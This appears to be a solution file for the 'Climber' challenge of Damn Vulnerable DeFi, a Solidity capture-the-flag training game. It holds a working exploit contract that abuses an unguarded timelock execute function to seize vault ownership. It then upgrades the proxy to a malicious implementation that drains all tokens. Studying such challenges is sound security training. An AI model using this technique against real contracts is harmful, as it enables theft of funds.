// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // Deploy the exploit contract
        Exploit exploit = new Exploit(timelock, address(vault), address(token), recovery);
        exploit.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Exploit {
    ClimberTimelock timelock;
    address vault;
    address token;
    address recovery;


    address[] targets = new address[](4);
    uint256[] values = [0, 0, 0, 0];
    bytes[] dataElements = new bytes[](4);

    constructor(ClimberTimelock _timelock, address _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;

        targets = [address(timelock), address(timelock), vault, address(this)];
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        dataElements[3] = abi.encodeWithSignature("scheduleTimelock()");
    }

    function attack() public {
        // Wrap a operation that will setup this contract to be the owner of the Vault
        // We will exploit the fact that the ClimberTimelock doesn't follow the CEI pattern in the execution function
        // calling the execute function while altering the state variables to make the operation ready for execution
        // and then gain ownership of the vault to upgrade it to a malicious version where we can drain the funds
        timelock.execute(targets, values, dataElements, "");
        // Now we are the owner of the vault and can upgrade it to a malicious implementation
        ClimberVault(vault).upgradeToAndCall(address(new maliciousVault()), abi.encodeWithSignature("withdrawAll(address,address)", token, recovery));
    }

    function scheduleTimelock() public {
        // Schedule the operation that will make this contract the owner of the vault
        ClimberTimelock(timelock).schedule(targets, values, dataElements, "");
    }

}

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract maliciousVault is ClimberVault {

    // we disable the constructor to avoid the initialization of the implementation by malicious actors
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function withdrawAll(address token, address recipient) external onlyOwner {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }

}
